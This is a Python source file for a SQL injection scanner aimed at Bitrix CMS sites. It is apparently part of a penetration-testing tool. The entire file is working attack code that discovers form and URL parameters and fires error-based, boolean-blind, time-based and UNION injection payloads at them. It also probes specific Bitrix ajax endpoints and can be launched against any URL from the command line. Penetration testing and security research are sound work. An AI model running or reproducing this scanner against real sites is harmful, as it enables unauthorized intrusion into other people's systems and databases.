#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQL Injection Scanner Module for Bitrix Pentest Tool (v2 — low-FP)

Key changes over v1
--------------------
1.  Payload reflection is stripped before HTML diff.
2.  Known-dynamic lines (CSRF tokens, timestamps, push channels,
    session hashes) are stripped before HTML diff.
3.  Parameters that never reach SQL (passwords, CSRF tokens, captchas)
    are skipped.
4.  Boolean detection requires a *confirmation* round — the same
    TRUE/FALSE pair must reproduce the same diff pattern twice.
5.  Baseline is sampled twice; if the two baselines already differ
    beyond threshold the parameter is marked "unstable" and skipped
    for boolean checks (still tested for error/union).
6.  UNION column-count probing is separated from marker injection:
    first find the right column count, then inject the marker.
7.  Time-based requires two consecutive matching delays, not one.
"""

import re
import time
import hashlib
import difflib

from urllib.parse import urljoin, parse_qs, urlparse, urlencode
from typing import Dict, List, Optional, Tuple, Any, Set
from dataclasses import dataclass, field, asdict


# =============================================================
# Data classes
# =============================================================

@dataclass
class SQLiFinding:
    severity: str
    sqli_type: str
    url: str
    parameter: str
    payload: str
    description: str
    evidence: Optional[str] = None
    dbms: Optional[str] = None
    exploitable: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class SQLiResult:
    target: str
    findings: List[SQLiFinding] = field(default_factory=list)
    error_based: List[Dict[str, Any]] = field(default_factory=list)
    boolean_based: List[Dict[str, Any]] = field(default_factory=list)
    time_based: List[Dict[str, Any]] = field(default_factory=list)
    union_based: List[Dict[str, Any]] = field(default_factory=list)
    dbms_detected: Optional[str] = None

    def add_finding(self, finding: SQLiFinding) -> None:
        self.findings.append(finding)
        d = finding.to_dict()
        getattr(self, {
            "error": "error_based",
            "boolean": "boolean_based",
            "time": "time_based",
            "union": "union_based",
        }.get(finding.sqli_type, "error_based")).append(d)

    def get_critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == "critical")

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "dbms_detected": self.dbms_detected,
            "summary": {
                "total_findings": len(self.findings),
                "critical": sum(1 for f in self.findings if f.severity == "critical"),
                "high": sum(1 for f in self.findings if f.severity == "high"),
                "error_based": len(self.error_based),
                "boolean_based": len(self.boolean_based),
                "time_based": len(self.time_based),
                "union_based": len(self.union_based),
            },
            "all_findings": [f.to_dict() for f in self.findings],
        }


# =============================================================
# Scanner
# =============================================================

class BitrixSQLiScanner:

    # ---------------------------------------------------------
    # Parameters that Bitrix actually puts into SQL queries.
    # Everything else (AUTH_FORM, USER_PASSWORD, sessid …) is
    # skipped because injecting into them just adds noise.
    # ---------------------------------------------------------
    BITRIX_PARAMS = [
        "ID", "ELEMENT_ID", "SECTION_ID", "IBLOCK_ID", "BLOCK_ID",
        "PAGEN_1", "SIZEN_1", "SHOWALL_1",
        "sort", "by", "order",
        "PRODUCT_ID", "CATEGORY_ID",
        "ORDER_ID", "TASK_ID", "FORUM_ID", "TOPIC_ID",
        "FILE_ID", "FOLDER_ID",
    ]

    # Parameters that should NEVER be tested — they don't reach SQL
    # and testing them only wastes time / creates false positives.
    SKIP_PARAMS = {
        # auth / session
        "sessid", "csrf_token", "csrftoken", "csrf",
        "AUTH_FORM", "TYPE", "USER_LOGIN", "USER_PASSWORD",
        "USER_REMEMBER", "USER_CONFIRM_PASSWORD",
        "captcha_word", "captcha_sid", "captcha_code",
        # bitrix internals
        "bxajaxid", "AJAX_CALL", "logoutall",
        # honeypots
        "login", "password", "passwd",
    }

    # ---------------------------------------------------------
    # SQL error signatures
    # ---------------------------------------------------------
    ERROR_PATTERNS = {
        "mysql": [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"MySQLSyntaxErrorException",
            r"You have an error in your SQL syntax",
            r"Unknown column",
        ],
        "pgsql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
        ],
        "mssql": [
            r"Driver.* SQL[\-_ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL.*Server.*Driver",
            r"Warning.*mssql_",
            r"Exception.*\WSystem\.Data\.SqlClient\.",
        ],
        "oracle": [
            r"\bORA-\d{4,5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_",
            r"Warning.*\Wora_",
        ],
        "sqlite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
        ],
    }

    # ---------------------------------------------------------
    # Payloads — trimmed to essentials
    # ---------------------------------------------------------
    PAYLOADS = {
        "error": [
            "'",
            "1'",
            "1\"",
            "' OR '1'='1",
            "') OR 1=1--",
        ],
        "boolean_true": [
            "1 AND 1=1",
            "1' AND '1'='1",
            "1' AND 1=1--",
        ],
        "boolean_false": [
            "1 AND 1=2",
            "1' AND '1'='2",
            "1' AND 1=2--",
        ],
        "time_mysql": [
            "' AND SLEEP({delay})--",
            "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
        ],
        "time_pgsql": [
            "'; SELECT pg_sleep({delay})--",
        ],
        "time_mssql": [
            "'; WAITFOR DELAY '0:0:{delay}'--",
        ],
        "union_probe": [
            # column-count probing — NULL only, no marker yet
            "' UNION SELECT {cols}--",
            "' UNION ALL SELECT {cols}--",
            "') UNION SELECT {cols}--",
        ],
    }

    # Regex for lines that change between ANY two requests
    # (tokens, nonces, push-channel IDs, timestamps).
    _DYNAMIC_LINE_RE = re.compile(
        r"(sessid|csrftoken|csrf_token|bitrix_sessid"
        r"|pullConfig|BX\.message|BX\.util\.add_url_param"
        r"|\"channels\":\{|\"private\":\{|\"clientId\""
        r"|CACHE_TIME|bx_session_id"
        r"|https?://b24\.to/a/s\d/"
        r"|\b[0-9a-f]{32,64}\b"       # bare hex hashes / tokens
        r"|\"start\":\"20\d\d-"        # ISO timestamps
        r"|\"end\":\"20\d\d-"
        r")",
        re.IGNORECASE,
    )

    # Max columns to probe in UNION detection
    _UNION_MAX_COLS = 12

    def __init__(self, requester, logger, parser):
        self.requester = requester
        self.logger = logger
        self.parser = parser
        self.dbms: Optional[str] = None

    # =========================================================
    # Main entry
    # =========================================================

    def scan(self, target_url: str, aggressive: bool = False) -> SQLiResult:
        self.logger.info(f"Starting SQLi scan for {target_url}")
        result = SQLiResult(target=target_url)
        base_url = self._normalize_url(target_url)

        endpoints = self._discover_endpoints(base_url)
        self.logger.info(f"Discovered {len(endpoints)} endpoints")

        self.logger.info("Phase 1/4: error-based")
        self._test_error_based(base_url, endpoints, result)

        self.logger.info("Phase 2/4: boolean-based blind")
        self._test_boolean_based(base_url, endpoints, result)

        if aggressive:
            self.logger.info("Phase 3/4: time-based blind")
            self._test_time_based(base_url, endpoints, result)

        self.logger.info("Phase 4/4: UNION-based")
        self._test_union_based(base_url, endpoints, result)

        self.logger.info("Testing Bitrix-specific endpoints")
        self._test_bitrix_endpoints(base_url, result)

        if self.dbms:
            result.dbms_detected = self.dbms

        total = len(result.findings)
        critical = result.get_critical_count()
        self.logger.info(f"SQLi scan complete: {total} findings ({critical} critical)")
        return result

    # =========================================================
    # Helpers
    # =========================================================

    @staticmethod
    def _normalize_url(url: str) -> str:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        return url.rstrip("/")

    def _should_skip_param(self, name: str) -> bool:
        """Return True for parameters that never reach SQL."""
        low = name.lower()
        if low in {s.lower() for s in self.SKIP_PARAMS}:
            return True
        # Skip anything that looks like a password / token field
        if any(kw in low for kw in ("password", "passwd", "captcha", "csrf", "token")):
            return True
        return False

    def _build_url(self, url: str, params: Dict[str, str]) -> str:
        q = urlencode(params, doseq=True)
        return f"{url}?{q}" if q else url

    # =========================================================
    # Request with logging
    # =========================================================

    def _request(self, method: str, url: str, params: Dict[str, str],
                 timeout: Optional[int] = None):
        method = method.upper()
        if method == "GET":
            req_url = self._build_url(url, params)
            self.logger.info(f"SQLi {method} {req_url}")
            resp = self.requester.get(req_url, timeout=timeout) if timeout else self.requester.get(req_url)
        else:
            self.logger.info(f"SQLi {method} {url} body={urlencode(params, doseq=True)}")
            resp = (self.requester.post(url, data=params, timeout=timeout)
                    if timeout else self.requester.post(url, data=params))
        if resp:
            self.logger.info(f"  -> {resp.status_code} len={len(resp.text)}")
        return resp

    # =========================================================
    # HTML normalization & diff
    # =========================================================

    def _normalize_lines(self, html: str) -> List[str]:
        """Split HTML into stable, one-tag-per-line form."""
        if not html:
            return []
        html = html.replace("\r\n", "\n").replace("\r", "\n")
        html = re.sub(r">\s*<", ">\n<", html)
        lines = []
        for raw in html.splitlines():
            line = re.sub(r"[ \t]+", " ", raw.strip())
            if line:
                lines.append(line)
        return lines

    def _strip_dynamic(self, lines: List[str]) -> List[str]:
        """Remove lines that change between any two normal requests."""
        return [l for l in lines if not self._DYNAMIC_LINE_RE.search(l)]

    def _strip_reflection(self, lines: List[str], payload: str) -> List[str]:
        """
        Remove lines whose ONLY change is the reflected payload.

        This is the single biggest FP killer: Bitrix echoes query
        params into action=, backurl=, href= attributes. If a line
        differs from baseline only because it contains the URL-encoded
        or raw payload, it is NOT evidence of SQL execution.
        """
        if not payload:
            return lines
        # Build several escaped forms of the payload
        escaped = {
            payload,
            payload.replace("'", "%27").replace('"', "%22"),
            payload.replace(" ", "+"),
            payload.replace("'", "%27").replace(" ", "+"),
            payload.replace("'", "&#039;"),
            payload.replace("<", "&lt;").replace(">", "&gt;"),
        }
        # Also URL-encode the whole thing
        from urllib.parse import quote, quote_plus
        escaped.add(quote(payload))
        escaped.add(quote_plus(payload))

        filtered = []
        for line in lines:
            clean = line
            for esc in escaped:
                clean = clean.replace(esc, "")
            filtered.append(clean)
        return filtered

    def _diff_lines(self, baseline: List[str], response: List[str]) -> List[Tuple[str, str]]:
        """Return (+, line) / (-, line) tuples — equal lines omitted."""
        sm = difflib.SequenceMatcher(None, baseline, response, autojunk=False)
        changes = []
        for tag, i1, i2, j1, j2 in sm.get_opcodes():
            if tag == "equal":
                continue
            if tag in ("delete", "replace"):
                for l in baseline[i1:i2]:
                    changes.append(("-", l))
            if tag in ("insert", "replace"):
                for l in response[j1:j2]:
                    changes.append(("+", l))
        return changes

    def _meaningful_diff(self, baseline_html: str, response_html: str,
                         payload: str = "") -> List[Tuple[str, str]]:
        """
        Full pipeline: normalize → strip dynamic → strip reflection → diff.
        Only truly meaningful HTML changes survive.
        """
        bl = self._strip_dynamic(self._normalize_lines(baseline_html))
        rl = self._strip_dynamic(self._normalize_lines(response_html))
        if payload:
            rl = self._strip_reflection(rl, payload)
            bl = self._strip_reflection(bl, payload)
        return self._diff_lines(bl, rl)

    # =========================================================
    # Stable baseline (sampled twice)
    # =========================================================

    def _get_stable_baseline(self, url: str, method: str, params: Dict[str, str],
                             param_name: str) -> Optional[Dict[str, Any]]:
        """
        Take two baselines and check they are stable (after stripping
        dynamic content).  If the page is inherently unstable for this
        param, return the baseline but flag it.
        """
        resp1 = self._request(method, url, params)
        if not resp1:
            return None
        time.sleep(0.3)
        resp2 = self._request(method, url, params)
        if not resp2:
            return None

        body1, body2 = resp1.text, resp2.text
        jitter = self._meaningful_diff(body1, body2)
        unstable = len(jitter) > 2

        if unstable:
            self.logger.info(f"BASELINE UNSTABLE for {param_name}: {len(jitter)} jitter lines")

        return {
            "status": resp1.status_code,
            "body": body1,
            "body_len": len(body1),
            "unstable": unstable,
            "jitter_lines": len(jitter),
        }

    # =========================================================
    # SQL error detection
    # =========================================================

    def _detect_sql_error(self, content: str) -> Tuple[Optional[str], Optional[str]]:
        if not content:
            return None, None
        for dbms, patterns in self.ERROR_PATTERNS.items():
            for pat in patterns:
                try:
                    m = re.search(pat, content, re.IGNORECASE)
                except re.error:
                    continue
                if m:
                    return dbms, m.group(0)
        return None, None

    # =========================================================
    # Phase 1: Error-based
    # =========================================================

    def _test_error_based(self, base_url: str, endpoints: List, result: SQLiResult):
        for url, method, params in endpoints:
            for pname in list(params.keys()):
                if self._should_skip_param(pname):
                    continue

                baseline = self._get_stable_baseline(url, method, params, pname)
                if not baseline:
                    continue

                # Check that the baseline itself doesn't already match error patterns
                _, baseline_err = self._detect_sql_error(baseline["body"])
                if baseline_err:
                    self.logger.info(f"SKIP {pname}: baseline already contains SQL error text")
                    continue

                for payload in self.PAYLOADS["error"]:
                    tp = params.copy()
                    tp[pname] = payload
                    try:
                        resp = self._request(method, url, tp)
                        if not resp:
                            continue
                        dbms, err = self._detect_sql_error(resp.text)
                        if not dbms:
                            continue
                        self.dbms = dbms
                        result.add_finding(SQLiFinding(
                            severity="critical", sqli_type="error",
                            url=url, parameter=pname, payload=payload,
                            description=f"Error-based SQLi in {pname}",
                            evidence=err[:200] if err else None,
                            dbms=dbms, exploitable=True,
                        ))
                        self.logger.critical(f"CONFIRMED error SQLi: {url} | {pname} | {dbms}")
                        break
                    except Exception as exc:
                        self.logger.debug(f"Error testing {url}: {exc}")

    # =========================================================
    # Phase 2: Boolean-based (with confirmation)
    # =========================================================

    def _test_boolean_based(self, base_url: str, endpoints: List, result: SQLiResult):
        true_payloads = self.PAYLOADS["boolean_true"]
        false_payloads = self.PAYLOADS["boolean_false"]

        for url, method, params in endpoints:
            for pname in list(params.keys()):
                if self._should_skip_param(pname):
                    continue

                baseline = self._get_stable_baseline(url, method, params, pname)
                if not baseline:
                    continue

                # If the page is already unstable, boolean detection
                # is unreliable — skip.
                if baseline["unstable"]:
                    self.logger.info(f"SKIP boolean for {pname}: unstable baseline")
                    continue

                bl_body = baseline["body"]

                for tp, fp in zip(true_payloads, false_payloads):
                    try:
                        if not self._boolean_check(url, method, params, pname,
                                                   bl_body, tp, fp):
                            continue

                        # ---- CONFIRMATION round ----
                        self.logger.info(f"Boolean candidate {pname} — running confirmation…")
                        time.sleep(0.5)

                        if not self._boolean_check(url, method, params, pname,
                                                   bl_body, tp, fp):
                            self.logger.info(f"Boolean NOT confirmed for {pname}")
                            continue

                        result.add_finding(SQLiFinding(
                            severity="high", sqli_type="boolean",
                            url=url, parameter=pname,
                            payload=f"{tp} / {fp}",
                            description="Boolean-based blind SQLi (confirmed)",
                            evidence=f"TRUE≈baseline, FALSE≠baseline (reproduced twice)",
                            exploitable=False,
                        ))
                        self.logger.warning(f"CONFIRMED boolean SQLi: {url} | {pname}")
                        break

                    except Exception as exc:
                        self.logger.debug(f"Boolean test error: {exc}")

    def _boolean_check(self, url, method, params, pname,
                       bl_body, true_payload, false_payload) -> bool:
        """Single TRUE/FALSE round. Returns True if the pattern matches."""
        tp = params.copy()
        tp[pname] = true_payload
        true_resp = self._request(method, url, tp)
        if not true_resp:
            return False

        fp = params.copy()
        fp[pname] = false_payload
        false_resp = self._request(method, url, fp)
        if not false_resp:
            return False

        # Meaningful diff (dynamic lines + reflection stripped)
        true_diff = self._meaningful_diff(bl_body, true_resp.text, true_payload)
        false_diff = self._meaningful_diff(bl_body, false_resp.text, false_payload)

        true_changes = len(true_diff)
        false_changes = len(false_diff)

        self.logger.info(
            f"  boolean {pname}: TRUE_changes={true_changes} FALSE_changes={false_changes}"
        )

        # TRUE must be very close to baseline
        if true_changes > 2:
            return False

        # FALSE must have meaningful divergence
        if false_changes < 5:
            return False

        # Body length difference between TRUE and FALSE
        if abs(len(true_resp.text) - len(false_resp.text)) < 200:
            return False

        # Status code sanity: if FALSE gives 4xx/5xx while TRUE gives 200
        # that *might* just be WAF / input validation, not SQLi.
        # Accept only when both return 200 (the page renders differently).
        if true_resp.status_code != false_resp.status_code:
            return False

        return True

    # =========================================================
    # Phase 3: Time-based (double confirmation)
    # =========================================================

    def _test_time_based(self, base_url: str, endpoints: List, result: SQLiResult):
        delay = 5  # seconds

        for url, method, params in endpoints:
            for pname in list(params.keys()):
                if self._should_skip_param(pname):
                    continue

                # Measure baseline timing (average of 2)
                times = []
                for _ in range(2):
                    try:
                        t0 = time.monotonic()
                        resp = self._request(method, url, params)
                        times.append(time.monotonic() - t0)
                        if not resp:
                            break
                    except Exception:
                        break

                if len(times) < 2:
                    continue
                baseline_time = max(times)  # conservative
                self.logger.info(f"TIME baseline for {pname}: {baseline_time:.2f}s")

                # Skip if the endpoint is already slow
                if baseline_time > 3:
                    self.logger.info(f"SKIP time-based for {pname}: baseline too slow")
                    continue

                all_payloads = (
                    self.PAYLOADS["time_mysql"]
                    + self.PAYLOADS["time_pgsql"]
                    + self.PAYLOADS["time_mssql"]
                )

                for tpl in all_payloads:
                    payload = tpl.format(delay=delay)
                    tp = params.copy()
                    tp[pname] = payload

                    try:
                        t0 = time.monotonic()
                        resp = self._request(method, url, tp, timeout=delay + 10)
                        elapsed = time.monotonic() - t0
                        delta = elapsed - baseline_time

                        self.logger.info(
                            f"  TIME {pname}: elapsed={elapsed:.2f}s "
                            f"baseline={baseline_time:.2f}s delta={delta:.2f}s"
                        )

                        if elapsed < (delay - 1) or delta < (delay - 2):
                            continue

                        # --- Confirmation round ---
                        self.logger.info(f"Time candidate {pname} — confirming…")
                        t0 = time.monotonic()
                        resp2 = self._request(method, url, tp, timeout=delay + 10)
                        elapsed2 = time.monotonic() - t0

                        if elapsed2 < (delay - 1):
                            self.logger.info(f"Time NOT confirmed for {pname}")
                            continue

                        result.add_finding(SQLiFinding(
                            severity="critical", sqli_type="time",
                            url=url, parameter=pname, payload=payload,
                            description="Time-based blind SQLi (confirmed x2)",
                            evidence=(f"round1={elapsed:.2f}s round2={elapsed2:.2f}s "
                                      f"baseline={baseline_time:.2f}s"),
                            exploitable=True,
                        ))
                        self.logger.critical(f"CONFIRMED time SQLi: {url} | {pname}")
                        break

                    except Exception as exc:
                        self.logger.debug(f"Time test error: {exc}")

    # =========================================================
    # Phase 4: UNION-based (probe columns first, then marker)
    # =========================================================

    def _make_marker(self) -> str:
        raw = f"{time.time_ns()}"
        return "SQLISCAN_" + hashlib.sha256(raw.encode()).hexdigest()[:16]

    def _test_union_based(self, base_url: str, endpoints: List, result: SQLiResult):
        for url, method, params in endpoints:
            for pname in list(params.keys()):
                if self._should_skip_param(pname):
                    continue

                baseline = self._get_stable_baseline(url, method, params, pname)
                if not baseline:
                    continue
                bl_body = baseline["body"]
                bl_len = baseline["body_len"]

                # Step 1: find column count that doesn't cause an error
                #         (response length stays similar to baseline
                #          OR we get a bigger page without SQL error)
                col_count = self._probe_union_columns(
                    url, method, params, pname, bl_body, bl_len
                )

                if col_count is None:
                    continue

                # Step 2: inject marker in every column position
                marker = self._make_marker()
                for pos in range(col_count):
                    cols = ["NULL"] * col_count
                    cols[pos] = f"'{marker}'"
                    union_expr = ",".join(cols)

                    for prefix in ("'", "')", ""):
                        for comment in ("--", "#", ""):
                            payload = f"{prefix} UNION SELECT {union_expr}{comment}"
                            tp = params.copy()
                            tp[pname] = payload

                            try:
                                resp = self._request(method, url, tp)
                                if not resp:
                                    continue

                                if marker in resp.text and marker not in bl_body:
                                    result.add_finding(SQLiFinding(
                                        severity="critical", sqli_type="union",
                                        url=url, parameter=pname, payload=payload,
                                        description="UNION SQLi confirmed by marker reflection",
                                        evidence=f"marker={marker} in col {pos+1}/{col_count}",
                                        exploitable=True,
                                    ))
                                    self.logger.critical(
                                        f"CONFIRMED UNION SQLi: {url} | {pname} "
                                        f"| cols={col_count} pos={pos}"
                                    )
                                    return  # found — stop all UNION tests

                            except Exception as exc:
                                self.logger.debug(f"UNION marker error: {exc}")

    def _probe_union_columns(self, url, method, params, pname,
                             bl_body, bl_len) -> Optional[int]:
        """
        Try UNION SELECT NULL,NULL,… with increasing columns.
        Return column count where response does NOT contain a SQL error
        and response length is close to baseline (± threshold) or bigger
        without error.
        """
        for n in range(1, self._UNION_MAX_COLS + 1):
            cols = ",".join(["NULL"] * n)
            for prefix in ("'", "')", ""):
                for comment in ("--", "#", ""):
                    payload = f"{prefix} UNION SELECT {cols}{comment}"
                    tp = params.copy()
                    tp[pname] = payload
                    try:
                        resp = self._request(method, url, tp)
                        if not resp:
                            continue

                        # If this column count triggers a SQL error, wrong count
                        dbms, _ = self._detect_sql_error(resp.text)
                        if dbms:
                            continue

                        rlen = len(resp.text)
                        # Heuristic: correct column count produces a page
                        # similar in size to baseline (not an error page)
                        # and doesn't shrink drastically.
                        if rlen >= bl_len * 0.8:
                            self.logger.info(
                                f"UNION column probe: n={n} looks viable "
                                f"(response={rlen}, baseline={bl_len})"
                            )
                            return n

                    except Exception:
                        continue
        return None

    # =========================================================
    # Bitrix-specific endpoints
    # =========================================================

    def _test_bitrix_endpoints(self, base_url: str, result: SQLiResult):
        bitrix_tests = [
            {
                "url": f"{base_url}/bitrix/components/bitrix/catalog.section/ajax.php",
                "method": "POST",
                "params": {"IBLOCK_ID": "1", "ELEMENT_SORT_FIELD": "shows"},
                "target_param": "IBLOCK_ID",
            },
            {
                "url": f"{base_url}/bitrix/components/bitrix/news.list/ajax.php",
                "method": "GET",
                "params": {"SECTION_ID": "1", "IBLOCK_ID": "1"},
                "target_param": "SECTION_ID",
            },
            {
                "url": f"{base_url}/bitrix/components/bitrix/sale.order.ajax/ajax.php",
                "method": "POST",
                "params": {"id": "1", "action": "getOrder"},
                "target_param": "id",
            },
        ]

        for test in bitrix_tests:
            try:
                turl = test["url"]
                method = test["method"]
                params = test["params"]
                tp = test["target_param"]

                # Baseline
                resp_bl = self._request(method, turl, params)
                if not resp_bl:
                    continue

                # Check baseline for pre-existing errors
                _, bl_err = self._detect_sql_error(resp_bl.text)
                if bl_err:
                    continue

                # Inject
                ip = params.copy()
                ip[tp] = "1'"
                resp = self._request(method, turl, ip)
                if not resp:
                    continue

                dbms, err = self._detect_sql_error(resp.text)
                if not dbms:
                    continue

                self.dbms = dbms
                result.add_finding(SQLiFinding(
                    severity="critical", sqli_type="error",
                    url=turl, parameter=tp, payload="1'",
                    description="Bitrix-specific error-based SQLi",
                    evidence=err[:200] if err else None,
                    dbms=dbms, exploitable=True,
                ))
                self.logger.critical(f"CONFIRMED Bitrix SQLi: {turl} | {tp} | {dbms}")

            except Exception as exc:
                self.logger.debug(f"Bitrix endpoint error: {exc}")

    # =========================================================
    # Endpoint discovery
    # =========================================================

    def _discover_endpoints(self, base_url: str) -> List[Tuple[str, str, Dict[str, str]]]:
        endpoints = []

        test_urls = [
            f"{base_url}/",
            f"{base_url}/catalog/",
            f"{base_url}/news/",
            f"{base_url}/search/",
        ]

        for url in test_urls:
            try:
                resp = self.requester.get(url)
                if not resp:
                    continue

                forms = self.parser.parse_html_forms(resp.text)
                for form in forms:
                    form_url = urljoin(url, form.get("action", ""))
                    method = form.get("method", "GET").upper()
                    form_params = {
                        inp["name"]: inp.get("value", "1")
                        for inp in form.get("inputs", [])
                        if inp.get("name")
                    }
                    if form_params:
                        endpoints.append((form_url, method, form_params))

                parsed = urlparse(url)
                if parsed.query:
                    qp = {k: "1" for k in parse_qs(parsed.query).keys()}
                    if qp:
                        endpoints.append((url, "GET", qp))

            except Exception as exc:
                self.logger.debug(f"Discovery error {url}: {exc}")

        # Add known Bitrix params on the root URL
        for p in self.BITRIX_PARAMS:
            endpoints.append((f"{base_url}/", "GET", {p: "1"}))

        # Deduplicate
        seen: Set[tuple] = set()
        unique = []
        for ep in endpoints:
            key = (ep[0], ep[1], tuple(sorted(ep[2].items())))
            if key not in seen:
                seen.add(key)
                unique.append(ep)
        return unique


# =============================================================
# CLI
# =============================================================

if __name__ == "__main__":
    import sys
    import logging

    sys.path.append("..")

    from utils.requester import Requester
    from utils.logger import ColoredLogger
    from utils.parser import BitrixParser

    logger = ColoredLogger(level=logging.DEBUG)
    requester = Requester()
    parser = BitrixParser()

    scanner = BitrixSQLiScanner(requester, logger, parser)

    if len(sys.argv) > 1:
        result = scanner.scan(sys.argv[1], aggressive="--aggressive" in sys.argv)
        print(f"\n{'=' * 60}")
        print(f"CRITICAL: {result.get_critical_count()}")
        print(f"DBMS:     {result.dbms_detected}")
        print(f"Findings: {len(result.findings)}")
        for f in result.findings:
            print(f"  [{f.severity}] {f.sqli_type}: {f.url} | {f.parameter} | {f.payload}")
